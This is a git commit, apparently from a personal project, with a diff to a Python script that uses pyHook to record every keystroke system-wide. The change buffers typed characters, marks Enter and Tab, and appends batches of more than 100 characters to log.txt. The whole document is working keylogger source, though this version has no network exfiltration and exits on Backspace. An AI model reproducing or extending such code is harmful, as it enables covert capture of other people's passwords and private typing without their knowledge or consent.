1e68567e4d528f051269934de9bdc15776205ad0
moneeb777 <moneeb777@hotmail.com>
2016-02-24 16:03:33 +0500

    OnKeyBoardEvent function changed to write keys to log.txt when a certain number of characters have been recorded.

--- code.py
+++ code.py
@@ -1,23 +1,36 @@
+
 import pyHook, pythoncom, sys, logging
 
-file_log='log.txt'
+file_log='log.txt'	#To output logged keys
+data=''			#To hold logged keys
 
 def OnKeyBoardEvent(event):
+	global data
 	# logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
 	# logging.log(10,chr(event.Ascii))
 	
 	if event.Ascii==8: #Exit on backspace
 		exit(1)
+	elif event.Ascii==13: #Carraige return representation
+		key='<ENTER>'
+	elif event.Ascii==9: #TAB Representation
+		key='<TAB>'
+	else:
+		key=chr(event.Ascii)
 
-	f=open('log.txt','a') #Open log file to write keys
+	data=data+key
 
-	if event.Ascii==13: #In case key is carraige return enter a new line in log file
-		f.write('\n')
-		f.close()
-		return True
-	
-	f.write(chr(event.Ascii)) 
+	if len(data)>100:
+		OutputKeys()
+	return True
+
+def OutputKeys(): 
+	global data
+
+	f=open('log.txt','a') #Open log file to write keyss
+	f.write(data) 
 	f.close()
+	data=''
 	return True
 
 hooks_manager=pyHook.HookManager()     #Create a hook
